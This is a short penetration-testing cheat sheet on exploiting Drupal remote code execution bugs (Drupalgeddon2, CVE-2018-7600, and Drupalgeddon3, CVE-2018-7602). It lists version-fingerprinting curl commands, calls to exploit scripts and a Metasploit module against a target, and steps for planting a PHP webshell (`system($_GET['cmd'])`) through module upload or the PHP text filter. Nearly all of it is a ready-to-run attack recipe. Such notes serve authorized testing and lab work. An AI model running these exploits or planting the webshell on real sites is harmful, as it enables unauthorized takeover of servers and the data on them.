# Drupal RCE (Drupalgeddon)

Multiple Drupal RCE CVEs — check version first.

**Version check:**
```bash
curl http://<TARGET>/CHANGELOG.txt | head -5
curl http://<TARGET>/core/CHANGELOG.txt | head -5
```

**CVE-2018-7600 (Drupalgeddon2) — unauthenticated, Drupal 6/7/8:**
```bash
python drupalgeddon2.py http://<TARGET>/
# or searchsploit:
searchsploit drupalgeddon2
```

**CVE-2018-7602 (Drupalgeddon3) — authenticated, Drupal 7/8:**
```bash
python drupalgeddon3.py http://<TARGET>/ --cookie "<session>" --form-id <node_id>
```

**Authenticated PHP code execution (Drupal 7 with admin access):**
1. Modules → Install new module → upload PHP webshell as `.zip`
2. Or: Configuration → Content authoring → Text formats → enable "PHP code" filter
3. Create a page with PHP payload:
   ```php
   <?php system($_GET['cmd']); ?>
   ```

**Metasploit:**
```bash
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS <TARGET>
run
```

**Searchsploit:**
```bash
searchsploit drupal | grep -i 'remote\|exec\|rce'
```
